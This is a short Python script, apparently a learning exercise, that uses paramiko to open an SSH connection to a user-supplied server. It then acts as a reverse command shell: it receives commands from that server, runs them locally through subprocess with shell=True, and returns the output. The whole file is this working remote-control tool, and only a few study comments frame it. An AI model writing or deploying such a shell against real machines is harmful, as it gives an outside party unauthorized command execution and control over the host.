import paramiko
import subprocess
import shlex #simple lexical analisys

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session() #return underlying transport object/new channel from the session
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024) #consistenly take commands from connection
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) #return output command in the form of bytes/shell-command execute through the shell
                ssh_session.send(cmd_output or 'okay') #return output to the calling party
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input("Enter username: ")
    password = getpass.getpass()

    ip = input("Enter server ip: ")
    port = input("Enter port: ")
    ssh_command(ip, port, user, password, 'ClientConnected') #?




